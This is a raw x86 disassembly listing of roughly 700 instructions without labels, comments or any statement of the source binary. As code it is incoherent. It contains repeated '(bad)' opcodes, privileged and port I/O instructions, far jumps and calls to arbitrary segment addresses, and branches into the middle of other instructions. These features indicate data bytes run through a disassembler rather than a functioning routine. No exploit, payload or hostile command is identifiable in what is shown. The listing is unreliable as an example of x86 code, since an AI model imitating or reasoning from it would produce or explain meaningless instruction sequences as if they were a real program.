  412f1e:	mov    eax,0xc00b55a4
  412f23:	cmc    
  412f24:	xchg   cl,al
  412f26:	lods   eax,DWORD PTR ds:[esi]
  412f27:	ror    DWORD PTR [ebp+0x1b],0x58
  412f2b:	repnz test DWORD PTR ds:0xd68c1255,0x4128ae02
  412f36:	jl     0x412f37
  412f38:	jbe    0x412ee0
  412f3a:	xor    BYTE PTR [esi+0x49],ch
  412f3d:	fs mov ebp,0x39eb8e6
  412f43:	dec    edi
  412f44:	push   cs
  412f45:	push   edx
  412f46:	stos   DWORD PTR es:[edi],eax
  412f47:	jge    0x412f52
  412f49:	mov    al,ds:0xc6aa607e
  412f4e:	dec    ebx
  412f4f:	icebp  
  412f50:	aas    
  412f51:	aad    0x75
  412f53:	sbb    ch,cl
  412f55:	(bad)  
  412f56:	pusha  
  412f57:	jo     0x412ef7
  412f59:	lods   al,BYTE PTR ds:[esi]
  412f5a:	cmp    eax,DWORD PTR [eax-0x71539e5]
  412f60:	and    DWORD PTR [ebx],0x393c6fa6
  412f66:	dec    esp
  412f67:	add    al,0x58
  412f69:	imul   ebx,ebx,0xffffff86
  412f6c:	xchg   ebx,eax
  412f6d:	vpcmpgtb xmm3,xmm5,XMMWORD PTR [eax-0x7]
  412f72:	jmp    0x48fd0c8f
  412f77:	aam    0xd5
  412f79:	int3   
  412f7a:	in     al,0x6e
  412f7c:	aas    
  412f7d:	mov    ds:0xaa96b8d3,al
  412f82:	clc    
  412f83:	ss daa 
  412f85:	inc    esp
  412f86:	mov    ch,0x85
  412f88:	add    edx,DWORD PTR [ebx-0x7c]
  412f8b:	sahf   
  412f8c:	jae    0x412fbc
  412f8e:	jae    0x412fbb
  412f90:	pop    edx
  412f92:	mov    al,0x35
  412f94:	cmc    
  412f95:	test   DWORD PTR [edi-0x361061ce],ecx
  412f9b:	xchg   esp,eax
  412f9c:	sub    edx,DWORD PTR [ebx+0xc]
  412f9f:	mov    ebx,0xe789e92c
  412fa4:	loop   0x412fa7
  412fa6:	adc    ah,BYTE PTR [ecx]
  412fa8:	mov    esp,0xd6a44ab4
  412fad:	idiv   DWORD PTR [esi-0x5c]
  412fb0:	jo     0x412fc7
  412fb2:	cmp    ebp,DWORD PTR [ebp-0x30edae09]
  412fb8:	push   ebp
  412fb9:	or     DWORD PTR [ecx+0x72],ebp
  412fbc:	shl    BYTE PTR [eax-0x6],1
  412fbf:	mov    al,0x20
  412fc1:	dec    edi
  412fc2:	and    al,0x21
  412fc4:	mov    bh,0x72
  412fc6:	in     al,0x9a
  412fc8:	sub    BYTE PTR [ebx],0xe9
  412fcb:	pop    esi
  412fcc:	pop    esp
  412fcd:	cmp    DWORD PTR [edi-0x2c8e913f],0x19
  412fd4:	mov    ah,0xcf
  412fd6:	push   ebp
  412fd7:	lods   eax,DWORD PTR ds:[esi]
  412fd8:	sbb    al,0x26
  412fda:	stc    
  412fdb:	mov    cl,0x58
  412fdd:	into   
  412fde:	stos   DWORD PTR es:[edi],eax
  412fdf:	sbb    esi,DWORD PTR [edx+0x69]
  412fe2:	cmp    BYTE PTR [ebp-0x138724df],0xfd
  412fe9:	dec    esi
  412fea:	sub    BYTE PTR [ebx+0x7],0x10
  412fee:	jle    0x41302a
  412ff0:	push   ebx
  412ff1:	jne    0x41303c
  412ff3:	dec    esi
  412ff4:	fucom  st(2)
  412ff6:	pop    ds
  412ff7:	test   DWORD PTR [ecx-0x53ecccfb],ebp
  412ffd:	sub    esp,DWORD PTR [eax-0x68]
  413000:	pop    ds
  413001:	nop
  413002:	jb     0x41302a
  413004:	cs retf 0x1076
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	adc    BYTE PTR [ebp+0x69],0xee
  41300d:	ss daa 
  41300f:	std    
  413010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413011:	mov    ebp,0x2d4c9749
  413016:	mov    ebx,0xdf07eab4
  41301b:	loopne 0x412fe1
  41301d:	int3   
  41301e:	ret    
  41301f:	stos   DWORD PTR es:[edi],eax
  413020:	adc    DWORD PTR [esi],0x46ef27ac
  413026:	adc    ebp,DWORD PTR [edx]
  413028:	repz mov ds:0x237404d6,eax
  41302e:	jb     0x413083
  413030:	xlat   BYTE PTR ds:[ebx]
  413031:	cmp    al,0x89
  413033:	stos   BYTE PTR es:[edi],al
  413034:	jne    0x413050
  413036:	adc    eax,0x22f28031
  41303b:	xchg   esp,eax
  41303c:	mov    ecx,0x6e30b3f5
  413041:	push   esp
  413042:	jbe    0x412fc4
  413044:	out    dx,eax
  413045:	xor    ah,BYTE PTR [ecx]
  413047:	out    dx,al
  413048:	adc    al,0x9e
  41304a:	cld    
  41304b:	and    dh,dl
  41304d:	in     eax,0xbd
  41304f:	rcl    BYTE PTR [ecx+0x38a60b3a],0x53
  413056:	pop    ebx
  413057:	fwait
  413058:	(bad)  
  413059:	mov    edi,0x4917706e
  41305e:	sub    cl,BYTE PTR [esi-0x206b2375]
  413064:	dec    eax
  413065:	popf   
  413066:	sbb    ecx,edx
  413068:	cmp    dl,BYTE PTR [edi+esi*4+0x33f70ecc]
  41306f:	mov    edx,0x570521af
  413074:	enter  0xc4b0,0x58
  413078:	xchg   ebp,eax
  413079:	push   cs
  41307a:	or     al,0x28
  41307c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41307d:	sub    al,0xdd
  41307f:	pop    eax
  413080:	pop    ebp
  413081:	pop    ecx
  413082:	jl     0x413034
  413084:	hlt    
  413085:	or     ecx,DWORD PTR [edx]
  413087:	sub    ah,BYTE PTR [edi]
  413089:	jle    0x4130d1
  41308b:	mov    edi,0x3185c318
  413090:	pop    ss
  413091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413092:	pop    eax
  413093:	mov    ebx,0x616b4f54
  413098:	cs push cs
  41309a:	ins    DWORD PTR es:[edi],dx
  41309b:	mov    es,WORD PTR [edi+0x7266515e]
  4130a1:	xchg   edi,eax
  4130a2:	mov    ebx,0xbda76332
  4130a7:	mov    cl,0x2d
  4130aa:	or     BYTE PTR [ebp-0x110ac7fc],0xbd
  4130b1:	xlat   BYTE PTR ds:[ebx]
  4130b2:	dec    esp
  4130b3:	jp     0x4130cb
  4130b5:	add    esi,0x2b675c98
  4130bb:	add    cl,ah
  4130bd:	pop    esp
  4130be:	adc    ah,BYTE PTR [edi]
  4130c0:	add    al,0x27
  4130c2:	clc    
  4130c3:	das    
  4130c4:	fsubr  DWORD PTR [eax-0x31]
  4130c7:	or     eax,0x7df68220
  4130cc:	or     bh,0x48
  4130cf:	dec    ebp
  4130d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130d1:	and    DWORD PTR [ebx],ebp
  4130d3:	and    cl,BYTE PTR [edi]
  4130d5:	dec    ebp
  4130d6:	mov    al,ds:0xe1e99dcc
  4130db:	mov    DWORD PTR [edi+eax*8+0x1adacb78],eax
  4130e2:	jmp    0x4130da
  4130e4:	inc    esi
  4130e5:	mov    ah,0xb1
  4130e7:	call   0x7d2b7bda
  4130ec:	popa   
  4130ed:	dec    ebx
  4130ee:	(bad)  
  4130ef:	sar    ecx,1
  4130f1:	mov    ds:0x9dc8e8c7,al
  4130f6:	jb     0x4130a9
  4130f8:	in     al,dx
  4130f9:	jo     0x413113
  4130fb:	sbb    BYTE PTR [ecx],bl
  4130fd:	cmp    cl,cl
  4130ff:	std    
  413100:	mov    al,0x2f
  413102:	mov    dl,0x86
  413104:	or     BYTE PTR [edx],bh
  413106:	pop    edx
  413107:	fistp  DWORD PTR [edx+0x60ae501a]
  41310d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41310e:	cmc    
  41310f:	and    eax,0xff78cccd
  413114:	scas   eax,DWORD PTR es:[edi]
  413115:	jle    0x4130a2
  413117:	addr16 loop 0x413169
  41311a:	xchg   ebp,eax
  41311b:	repnz mov dl,0x89
  41311e:	nop
  41311f:	adc    ah,BYTE PTR [edi]
  413121:	jl     0x413110
  413123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413124:	jnp    0x413139
  413126:	or     DWORD PTR [eax+eax*4-0xbaf50a],ebx
  41312d:	inc    ecx
  41312e:	cwde   
  41312f:	aaa    
  413130:	sub    eax,0x8cde17eb
  413135:	pop    ds
  413136:	shld   DWORD PTR ds:0xf51b0403,ebx,0x8
  41313e:	ror    BYTE PTR ds:0x9003b5d1,cl
  413144:	dec    eax
  413145:	dec    ebx
  413146:	pop    esi
  413147:	sub    ebp,edx
  413149:	add    al,0x27
  41314b:	popf   
  41314c:	shl    BYTE PTR [edx+0x55],cl
  41314f:	je     0x41313c
  413151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413152:	pop    ecx
  413153:	sub    eax,0x2c68bdd8
  413158:	imul   esp,ecx,0x30
  41315b:	inc    edx
  41315c:	inc    ebx
  41315d:	inc    edi
  41315e:	sub    eax,0x58810ee6
  413163:	dec    ebx
  413164:	lds    esp,FWORD PTR [ebp+ebp*4+0x66cb8f91]
  41316b:	cdq    
  41316c:	mov    ecx,0xc7e23899
  413171:	into   
  413172:	into   
  413173:	pop    edi
  413174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413175:	shr    BYTE PTR [ecx+0x48e0e777],cl
  41317b:	pop    ecx
  41317c:	hlt    
  41317d:	mov    ebx,0x1dd5f7bc
  413182:	pop    ss
  413183:	cwde   
  413184:	in     eax,dx
  413185:	fldcw  WORD PTR [ebx-0x73]
  413188:	aas    
  413189:	ja     0x413144
  41318b:	scas   al,BYTE PTR es:[edi]
  41318c:	fild   DWORD PTR [edx-0x1567cebc]
  413192:	outs   dx,DWORD PTR ds:[esi]
  413193:	xchg   BYTE PTR [eax+0x382e7302],bl
  413199:	cwde   
  41319a:	mov    ecx,eax
  41319c:	cmp    al,BYTE PTR [ebx+0x13]
  41319f:	mov    al,dl
  4131a1:	outs   dx,BYTE PTR ds:[esi]
  4131a2:	lods   al,BYTE PTR ds:[esi]
  4131a3:	mov    al,0xdf
  4131a5:	sub    DWORD PTR [eax-0x33],ebx
  4131a8:	lahf   
  4131a9:	es dec ebp
  4131ab:	ret    0xfe18
  4131ae:	xchg   edi,eax
  4131af:	push   ss
  4131b0:	test   al,0x7b
  4131b2:	ds enter 0xc67d,0xb0
  4131b7:	shr    DWORD PTR [ebx-0x44],1
  4131ba:	mov    ecx,0x98f64fef
  4131bf:	mov    bh,0xd9
  4131c1:	pushf  
  4131c2:	hlt    
  4131c3:	ret    
  4131c4:	adc    eax,0xda3f2f5a
  4131c9:	cmc    
  4131ca:	mov    cl,0x67
  4131cc:	pop    es
  4131cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ce:	daa    
  4131cf:	mov    WORD PTR [eax+0x7c],es
  4131d2:	ret    
  4131d3:	fnsave [edx+0x7b692db0]
  4131d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131da:	inc    edi
  4131db:	loopne 0x4131cb
  4131dd:	pop    edi
  4131de:	cmp    ch,BYTE PTR [ebp-0x65]
  4131e1:	scas   al,BYTE PTR es:[edi]
  4131e2:	mov    bl,0x98
  4131e4:	test   eax,0x60ba6e30
  4131e9:	mov    cl,0x35
  4131eb:	test   DWORD PTR [ecx-0x7c101805],ebx
  4131f1:	js     0x41321d
  4131f3:	add    ebx,DWORD PTR [ebp-0x70]
  4131f6:	stc    
  4131f7:	jmp    0x413189
  4131f9:	dec    ecx
  4131fa:	hlt    
  4131fb:	inc    ecx
  4131fc:	fdiv   QWORD PTR [esi+ebp*8]
  4131ff:	push   ds
  413200:	aad    0xee
  413202:	mov    ecx,0xc98b91c5
  413207:	inc    edx
  413208:	and    eax,0xff30abb3
  41320d:	or     ebp,0x3701f7f4
  413213:	in     al,0x64
  413215:	inc    ebx
  413216:	es loopne 0x4131d6
  413219:	ret    0xd3d6
  41321c:	xchg   esp,eax
  41321d:	in     eax,dx
  41321e:	arpl   WORD PTR [ebx],cx
  413220:	sbb    eax,edi
  413222:	xchg   esi,eax
  413223:	js     0x413265
  413225:	leave  
  413226:	mov    ebp,0x1ecb25ff
  41322b:	in     al,dx
  41322c:	inc    esp
  41322d:	int3   
  41322e:	push   ecx
  41322f:	push   ebp
  413230:	out    dx,eax
  413231:	stc    
  413232:	xchg   ebp,eax
  413233:	iret   
  413234:	dec    eax
  413235:	shl    BYTE PTR [ecx-0x21],0x6
  413239:	dec    ebx
  41323a:	cmp    cl,BYTE PTR [edi-0x41ba2680]
  413240:	jmp    0x5fed:0x86a46b68
  413247:	and    al,0x90
  413249:	lods   eax,DWORD PTR gs:[esi]
  41324b:	jl     0x413259
  41324d:	imul   ecx,DWORD PTR ds:0x4719272f,0x5c
  413254:	sar    BYTE PTR [ebx-0x7f979d8b],cl
  41325a:	jns    0x413291
  41325c:	aaa    
  41325d:	ror    DWORD PTR [edi+0x3db6cbb7],1
  413263:	dec    ebp
  413264:	lods   eax,DWORD PTR ds:[esi]
  413265:	mov    esp,0x4d90d2d
  41326a:	fdiv   QWORD PTR [esi+eiz*1]
  41326d:	cmp    DWORD PTR [ebx+0x3d],esi
  413270:	jl     0x4132e0
  413272:	push   ebx
  413273:	xor    BYTE PTR [esi-0x62],bl
  413276:	mov    ebp,0xd07195ec
  41327b:	outs   dx,BYTE PTR ds:[esi]
  41327c:	rcr    DWORD PTR [esi-0x79],1
  41327f:	stos   BYTE PTR es:[edi],al
  413280:	mov    ebx,0x826e51d5
  413285:	sbb    ecx,DWORD PTR [edi]
  413287:	push   esp
  413288:	cmp    DWORD PTR [ecx],esp
  41328a:	inc    eax
  41328b:	(bad)  
  41328c:	popf   
  41328d:	je     0x413224
  41328f:	sbb    al,0xf5
  413291:	or     al,0x4d
  413293:	fs gs sti 
  413296:	popf   
  413297:	les    edx,FWORD PTR [esi*8-0x6ee518a5]
  41329e:	iret   
  41329f:	cmc    
  4132a0:	push   esp
  4132a1:	sbb    BYTE PTR [esi-0x69],al
  4132a4:	mov    ah,0xb6
  4132a6:	mov    fs,WORD PTR [eax]
  4132a8:	or     al,0xe2
  4132aa:	stos   DWORD PTR es:[edi],eax
  4132ab:	dec    ebp
  4132ac:	push   cs
  4132ad:	(bad)  
  4132ae:	aam    0x8a
  4132b0:	or     DWORD PTR [edx-0x3dc7a412],esp
  4132b6:	(bad)  
  4132b7:	adc    BYTE PTR [ebx+0x51452bba],bh
  4132bd:	xor    al,0x6
  4132bf:	cmp    BYTE PTR [edi-0x4d],bl
  4132c2:	mov    ds:0x7a1706a0,al
  4132c7:	adc    edx,ebp
  4132c9:	mov    ds:0x912a0b50,al
  4132ce:	arpl   WORD PTR [esi+0x3f6e1989],si
  4132d4:	cdq    
  4132d5:	rcl    DWORD PTR [ebp-0x3e],0x66
  4132d9:	jns    0x413353
  4132db:	loope  0x4132f3
  4132dd:	pop    ecx
  4132de:	and    ah,cl
  4132e0:	clc    
  4132e1:	sub    BYTE PTR [ecx+0x7a],0x9c
  4132e5:	std    
  4132e6:	push   ds
  4132e7:	cmp    esp,edi
  4132e9:	sub    eax,0xe2f6f979
  4132ee:	xchg   esp,eax
  4132ef:	or     esp,DWORD PTR [ecx+eax*8-0x515b1dd0]
  4132f6:	inc    BYTE PTR [ebp-0x61]
  4132f9:	iret   
  4132fa:	sbb    DWORD PTR [ebp+ebp*4-0x67],esi
  4132fe:	pop    ecx
  4132ff:	test   ch,bl
  413301:	xor    eax,DWORD PTR [ecx+0x58]
  413304:	push   ecx
  413305:	inc    ebx
  413306:	mov    eax,0x60bbdee0
  41330b:	push   0x59
  41330d:	push   0xdb7f2145
  413312:	xchg   esp,eax
  413313:	(bad)  
  413314:	push   esp
  413315:	pushf  
  413316:	add    eax,0x46fa220a
  41331b:	pop    edi
  41331c:	jnp    0x4132af
  41331e:	sub    eax,DWORD PTR [edx+0x7c]
  413321:	push   0x1a
  413323:	dec    edi
  413324:	out    dx,al
  413325:	int3   
  413326:	outs   dx,BYTE PTR ds:[esi]
  413327:	test   DWORD PTR [eax+eax*2-0x57],ecx
  41332b:	inc    eax
  41332c:	hlt    
  41332d:	adc    edx,edi
  41332f:	ss hlt 
  413331:	push   edx
  413332:	add    DWORD PTR [ebp+0x15d84bb1],0x7798b140
  41333c:	repnz test al,0x88
  41333f:	sub    eax,DWORD PTR [edi+0x65e04074]
  413345:	add    DWORD PTR [ebx+0xc],0xffffffda
  413349:	rcr    esi,1
  41334b:	retf   
  41334c:	loope  0x413353
  41334e:	(bad)  
  41334f:	fcmovu st,st(0)
  413351:	push   esp
  413352:	pusha  
  413353:	jo     0x413321
  413355:	push   cs
  413356:	push   ds
  413357:	dec    ecx
  413358:	sti    
  413359:	(bad)  
  41335a:	cmc    
  41335b:	inc    esi
  41335c:	mov    ch,0xfc
  41335e:	mov    cl,0x5a
  413360:	lock inc edx
  413362:	mov    bl,0xcd
  413364:	enter  0xec34,0x4
  413368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413369:	inc    eax
  41336a:	cwde   
  41336b:	iret   
  41336c:	push   ss
  41336d:	ja     0x413302
  41336f:	fdiv   DWORD PTR [esi+0x2c]
  413372:	add    eax,DWORD PTR [ebx+0x51]
  413375:	rcl    edi,cl
  413377:	jbe    0x4133d5
  413379:	(bad)  
  41337a:	sub    eax,0x5d75ce5
  41337f:	addr16 iret 
  413381:	test   DWORD PTR [eax+ebx*8],0xb95cf448
  413388:	mov    cs,WORD PTR [edi]
  41338a:	clc    
  41338b:	pop    esp
  41338c:	call   0x8032:0x3babc738
  413393:	aam    0x9
  413395:	pop    esp
  413396:	mov    cl,0x5b
  413398:	cmp    edx,ebp
  41339a:	iret   
  41339b:	jo     0x413369
  41339d:	(bad)  
  41339e:	adc    dl,dh
  4133a0:	jmp    0x20e0a933
  4133a5:	adc    edx,ecx
  4133a7:	clc    
  4133a8:	fs (bad) 
  4133ab:	scas   al,BYTE PTR es:[edi]
  4133ac:	sbb    DWORD PTR [edx+edi*8],ebx
  4133af:	or     ecx,eax
  4133b1:	retf   
  4133b2:	out    0xe6,eax
  4133b4:	xor    DWORD PTR [ebx+0x65],0xffffff98
  4133b8:	xor    DWORD PTR [ecx-0x210f5407],ecx
  4133be:	push   ebp
  4133bf:	mov    bl,0x59
  4133c1:	adc    al,0xee
  4133c3:	out    0x65,al
  4133c5:	mov    ds:0x4e52a01c,eax
  4133ca:	ds inc esi
  4133cc:	jecxz  0x4133de
  4133ce:	dec    esp
  4133cf:	shl    BYTE PTR [ebp-0x7d],1
  4133d2:	adc    bh,ah
  4133d4:	out    0xa2,al
  4133d6:	mov    eax,0xb30c8693
  4133db:	mov    ah,0xbb
  4133dd:	std    
  4133de:	in     eax,0x0
  4133e0:	dec    edi
  4133e1:	add    DWORD PTR [esi+0x43e124c6],edx
  4133e7:	fmul   QWORD PTR [ebx-0x4f1bc960]
  4133ed:	sti    
  4133ee:	mov    ecx,0xf39ef835
  4133f4:	inc    ecx
  4133f5:	imul   edx,ecx,0x30bd57e3
  4133fb:	add    esp,ecx
  4133fd:	into   
  4133fe:	dec    edi
  4133ff:	sbb    DWORD PTR [ecx],0xc19aec63
  413405:	mov    edx,0x678d0f9
  41340a:	cmp    dh,ch
  41340c:	js     0x413467
  41340e:	cdq    
  41340f:	or     ebp,DWORD PTR [eax+0x56]
  413412:	mov    BYTE PTR [ecx],dl
  413414:	leave  
  413415:	out    0xd8,al
  413417:	out    0x2f,al
  413419:	cmp    eax,0x8f344a0e
  41341e:	adc    eax,0xa82bc096
  413423:	xchg   esi,eax
  413424:	jl     0x4133a7
  413426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413427:	cmp    bl,dl
  413429:	jbe    0x41341e
  41342b:	mov    al,0xd
  41342d:	lods   eax,DWORD PTR ds:[esi]
  41342e:	mov    esi,0x609e76ff
  413433:	jo     0x413404
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	dec    ebx
  413437:	daa    
  413438:	pusha  
  413439:	dec    esp
  41343a:	leave  
  41343b:	in     al,dx
  41343c:	ins    BYTE PTR es:[edi],dx
  41343d:	arpl   WORD PTR [edi],sp
  41343f:	mov    edx,0xa9e8627
  413444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413445:	(bad)  
  413447:	adc    ecx,DWORD PTR [eax-0x5bde83b3]
  41344d:	pop    eax
  41344e:	test   eax,0x74d2698
  413453:	data16 std 
  413455:	sbb    BYTE PTR [ebp+0x3b01d72f],bh
  41345b:	es mov ch,0x8
  41345e:	std    
  41345f:	dec    ebp
  413460:	lock pusha 
  413462:	cmp    al,ch
  413464:	dec    ebx
  413465:	cmp    BYTE PTR [esi+edx*4+0x4e],bh
  413469:	pop    ecx
  41346a:	ss inc ebp
  41346c:	stc    
  41346d:	pop    edx
  41346e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41346f:	mov    dl,0x66
  413471:	fwait
  413472:	jb     0x4134ca
  413474:	pop    esp
  413475:	pop    ecx
  413476:	sbb    dl,BYTE PTR [esi+0x63e51559]
  41347c:	sar    DWORD PTR [edi+0x18],1
  41347f:	int3   
  413480:	js     0x41349d
  413482:	cmp    ch,dl
  413484:	nop
  413485:	scas   eax,DWORD PTR es:[edi]
  413486:	(bad)  
  413487:	pop    esi
  413488:	mov    edx,0xe67bb214
  41348d:	sbb    eax,0x406bb158
  413492:	mov    al,ds:0xf4294a48
  413497:	and    ebp,DWORD PTR [ebp+0x37700392]
  41349d:	jge    0x4134d4
  41349f:	mov    bh,ah
  4134a1:	xlat   BYTE PTR ds:[ebx]
  4134a2:	or     al,0x2e
  4134a4:	ins    DWORD PTR es:[edi],dx
  4134a5:	push   ecx
  4134a6:	movd   mm0,esp
  4134a9:	std    
  4134aa:	adc    ebp,DWORD PTR ds:0xb8e3ebe5
  4134b0:	add    BYTE PTR [ecx-0x25],ah
  4134b3:	test   al,0xd7
  4134b5:	das    
  4134b6:	pushf  
  4134b7:	inc    esp
  4134b8:	push   ds
  4134b9:	jno    0x413457
  4134bb:	jae    0x4134bc
  4134bd:	jl     0x413477
  4134bf:	shr    dh,1
  4134c1:	stc    
  4134c2:	jmp    ebx
  4134c4:	loopne 0x413537
  4134c6:	mov    cl,0x9d
  4134c8:	xchg   ebp,eax
  4134c9:	mov    eax,ds:0xef8cf641
  4134ce:	inc    esi
  4134cf:	retf   
  4134d0:	push   eax
  4134d1:	sbb    esi,DWORD PTR [ebx]
  4134d3:	push   ebp
  4134d4:	out    dx,eax
  4134d5:	xor    eax,0x5bf388e7
  4134da:	pop    ds
  4134db:	leave  
  4134dc:	xchg   esp,eax
  4134dd:	std    
  4134de:	fnstsw WORD PTR [esi]
  4134e0:	mov    esi,0xc25c8965
  4134e5:	xchg   ebp,eax
  4134e6:	test   DWORD PTR [ebp+edx*1-0x777e34ad],0x191ffb6c
  4134f1:	fistp  DWORD PTR [ebx]
  4134f3:	cmove  ebp,DWORD PTR [esp+eiz*2]
  4134f7:	adc    al,al
  4134f9:	jmp    0xce63:0xcd3f52d0
  413500:	ins    DWORD PTR es:[edi],dx
  413501:	fadd   DWORD PTR [ebx-0x10fec306]
  413507:	test   DWORD PTR [ebp-0x14316b3d],ebp
  41350d:	and    cl,0x4
  413510:	ret    0xaef7
  413513:	dec    esp
  413514:	test   al,0xa6
  413516:	push   es
  413517:	inc    edx
  413518:	jmp    0x1bd59dbd
  41351d:	ret    0x2a60
  413520:	xor    BYTE PTR [edx-0x77],cl
  413523:	into   
  413524:	adc    ecx,DWORD PTR [ecx-0x21b98d7c]
  41352a:	fbstp  TBYTE PTR [esi+0x7076b499]
  413530:	pop    edx
  413531:	mov    dl,0xc9
  413533:	adc    eax,0x9d5a4455
  413538:	dec    esi
  413539:	cmp    BYTE PTR [ebp+0xf],0x97
  41353d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	pop    ss
  413540:	xchg   edi,eax
  413541:	std    
  413542:	leave  
  413543:	cmp    al,0xde
  413545:	cmp    DWORD PTR [ebx+ebx*8+0x6b],eax
  413549:	mov    ebx,ecx
  41354b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41354c:	xchg   BYTE PTR [ecx],dl
  41354e:	xchg   ebp,eax
  41354f:	xchg   esi,eax
  413550:	mov    bl,0xd0
  413552:	jmp    0x692a:0x76a2dfdf
  413559:	xchg   al,cl
  41355b:	(bad)  
  41355c:	jecxz  0x4135b0
  41355e:	mov    ch,0x41
  413560:	ret    
  413561:	jmp    0x8ef5:0x78d6d4c
  413568:	adc    DWORD PTR [edi],eax
  41356a:	cwde   
  41356b:	or     BYTE PTR [esi-0x27f5379d],ah
  413571:	jp     0x413540
  413573:	aaa    
  413574:	or     al,0xb2
  413576:	adc    edx,eax
  413578:	icebp  
  413579:	ins    BYTE PTR es:[edi],dx
  41357a:	inc    ebx
  41357b:	cwde   
  41357c:	ret    
  41357d:	fild   WORD PTR [edi-0x69501966]
  413583:	into   
  413584:	shl    BYTE PTR [eax+ecx*2+0x44ff7532],0xc1
  41358c:	js     0x413594
  41358e:	fwait
  41358f:	sbb    ch,BYTE PTR [esi+0x32]
  413592:	pushf  
  413593:	add    DWORD PTR [edi],ecx
  413595:	mov    ebp,0xdd9a710d
  41359a:	fbstp  TBYTE PTR [esi+0x4a053c99]
  4135a0:	inc    eax
  4135a1:	inc    esp
  4135a2:	xchg   edi,eax
  4135a3:	xchg   esi,eax
  4135a4:	cmp    BYTE PTR [ecx],dh
  4135a6:	fdiv   QWORD PTR [eax+ecx*1]
  4135a9:	loope  0x4135da
  4135ab:	mov    eax,0xa0925bda
  4135b0:	mov    ebp,0x95f6d4c9
  4135b5:	mov    bh,al
  4135b7:	mov    ds,WORD PTR [edx-0x33]
  4135ba:	aad    0xea
  4135bc:	retf   
  4135bd:	loopne 0x4135ea
  4135bf:	cmpxchg dh,dl
  4135c2:	jae    0x41356c
  4135c4:	mov    ecx,0xe2fe88ff
  4135c9:	and    DWORD PTR [ebx+edi*2],ebp
  4135cc:	popa   
  4135cd:	dec    ecx
  4135ce:	shr    BYTE PTR [ebp-0x2fb651ee],cl
  4135d4:	lods   eax,DWORD PTR ds:[esi]
  4135d5:	jge    0x4135f5
  4135d7:	mov    eax,0xeeb198f
  4135dc:	iret   
  4135dd:	add    esp,DWORD PTR [eax]
  4135df:	sbb    BYTE PTR [esi],bl
  4135e1:	push   0xffffffd7
  4135e3:	imul   esp,DWORD PTR [eax-0x36267666],0xd2621723
  4135ed:	mov    si,WORD PTR [eax]
  4135f0:	push   eax
  4135f1:	jmp    FWORD PTR [edi+0x2d]
  4135f4:	ror    DWORD PTR [ecx],cl
  4135f6:	mov    BYTE PTR [ebp-0x32],bl
  4135f9:	ja     0x41358a
  4135fb:	fst    DWORD PTR [edx+0x79]
  4135fe:	inc    ebx
  4135ff:	mov    es,WORD PTR [ebx-0x70e1f8bd]
  413605:	test   BYTE PTR ss:[ebx],dl
  413608:	cld    
  413609:	imul   ebp,DWORD PTR [ecx],0xfffffff8
  41360c:	add    dh,0x61
  41360f:	add    edi,DWORD PTR ds:0x52be5d38
  413615:	scas   eax,DWORD PTR es:[edi]
  413616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413617:	mov    edi,edx
  413619:	jge    0x413643
  41361b:	xor    al,0xd7
  41361d:	mov    edi,0x43fec130
  413622:	test   BYTE PTR [ecx+0x15],ah
  413625:	xchg   esi,eax
  413626:	test   BYTE PTR [ecx],bl
  413628:	je     0x413622
  41362a:	sub    al,0x13
  41362c:	shr    DWORD PTR [edi],0x6e
  41362f:	dec    ebx
  413631:	jle    0x413664
  413633:	aas    
  413634:	jnp    0x413681
  413636:	popf   
  413637:	popa   
  413638:	xchg   esi,eax
  413639:	dec    ebx
  41363a:	add    al,0xf3
  41363c:	sub    al,0xe4
  41363e:	lea    esp,[ecx+edx*4-0x4ac14f4d]
  413645:	jl     0x41369a
  413647:	out    0x8b,al
  413649:	and    esp,DWORD PTR [esp+eax*2+0x2a]
  41364d:	rol    BYTE PTR [ebx-0x154bdb5e],cl
  413653:	adc    BYTE PTR [edx-0x38],ah
  413656:	and    al,0x7a
  413658:	stos   BYTE PTR es:[edi],al
  413659:	add    eax,0x5db38986
  41365e:	mov    DWORD PTR [ebx],0x42ca8800
  413664:	mov    ebx,0x2c470254
  413669:	sbb    ah,bl
  41366b:	and    al,0x50
  41366d:	cli    
  41366e:	mov    edx,DWORD PTR cs:[eax-0x38]
  413672:	xchg   ebx,eax
  413673:	pop    edx
  413674:	stc    
  413675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413676:	aad    0x48
  413678:	and    DWORD PTR [eax-0x11a0b275],ecx
  41367e:	(bad)  
  41367f:	popf   
  413680:	outs   dx,DWORD PTR ds:[esi]
  413681:	push   eax
  413682:	outs   dx,DWORD PTR ds:[esi]
  413683:	iret   
  413684:	add    eax,0xa818809d
  413689:	adc    DWORD PTR cs:[ebx],eax
  41368c:	inc    BYTE PTR [edx-0x51]
  41368f:	aam    0x44
  413691:	cmp    al,BYTE PTR [ebx-0x53f477bb]
  413697:	in     al,0xb1
  413699:	ud2    
  41369b:	inc    ebp
  41369c:	inc    eax
  41369d:	popa   
  41369e:	add    BYTE PTR [edx],al
  4136a0:	xor    BYTE PTR [ecx-0x2be5e15e],bl
  4136a6:	or     DWORD PTR [esp+eax*2],edi
  4136a9:	jle    0x413710
  4136ab:	mov    ecx,DWORD PTR [edx+0x17]
  4136ae:	fxam   
  4136b0:	das    
  4136b1:	dec    esi
  4136b2:	stc    
  4136b3:	repz add eax,0x77403c84
  4136b9:	jbe    0x41369f
  4136bb:	mov    BYTE PTR [ebp+0x40],dl
